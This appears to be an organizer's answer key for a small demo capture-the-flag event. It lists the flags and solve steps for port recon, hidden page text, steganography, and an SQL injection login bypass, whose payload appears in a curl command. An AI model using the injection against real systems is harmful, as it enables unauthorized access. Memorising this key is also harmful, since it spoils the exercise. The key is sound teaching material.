# Answer Key (organizer reference - not for participants)

Full solve steps for all 4 demo challenges. Replace `<ip>` with the host's
LAN IP printed by `./demo.sh up` (or `localhost` if running solo).

---

## 1. Recon - Diagnostics Port
**Flag:** `flag{n3tw0rk_r3c0n_1s_ez}`

```bash
nmap -p 2000-9300 -T4 <ip>
```
Shows 3 open ports: `2121`, `9200`, `7331`. Connect to each:
```bash
nc <ip> 7331
```
The banner on port 7331 contains the flag directly. Ports 2121 (fake FTP)
and 9200 (fake Elasticsearch) are decoys with no flag.

---

## 2. Web - Company Announcements (view page source)
**Flag:** `flag{v13w_s0urc3_ftw}`

1. Open `http://<ip>:5000/ch1` - page looks empty.
2. Right-click → **View Page Source** (or `Ctrl+U`).
3. `Ctrl+F` for `flag{` - it's in a `<p>` tag styled `color: white;
   background-color: white;`, so it renders invisibly but is present in
   the raw HTML.

---

## 3. Web - Staff Login (SQL injection bypass)
**Flag:** `flag{sql1_1s_n3v3r_s4f3}`

Go to `http://<ip>:5000/login`. Enter:
- Username: `admin' OR '1'='1' -- `
- Password: *(anything)*

**Why it works:** the server builds the query as a raw string:
```
SELECT username FROM users WHERE username='<input>' AND password='<input>'
```
The injected `'` closes the username string early, `OR '1'='1'` makes the
WHERE clause always true, and `-- ` comments out the rest of the original
query (including the password check).

---

## 4. Steganography - flag.png (LSB)
**Flag:** `flag{ls8_hunt3r_1}`

1. Download `flag.png` from `http://<ip>:5000` (linked on the homepage) or
   grab it directly from `stego/output/flag.png`.
2. Decode it:
```bash
python3 stego/decode_stego.py stego/output/flag.png
```
**How it's hidden:** the flag's text is converted to bits, and each bit
replaces the least-significant bit of one R/G/B color channel value across
the image's pixels, in order. Changing the lowest bit shifts a color value
by at most 1/255 - invisible to the eye, but recoverable by reading all the
lowest bits back in order.

---

## Quick copy-paste block (for testing before the demo)

```bash
IP=localhost   # or the LAN IP from ./demo.sh up

nc $IP 7331
curl -s http://$IP:5000/ch1 | grep -o 'flag{[^}]*}'
curl -s -X POST http://$IP:5000/login --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode "password=x" | grep -o 'flag{[^}]*}'
curl -s http://$IP:5000/static/challenges/flag.png -o /tmp/flag.png && python3 stego/decode_stego.py /tmp/flag.png
```
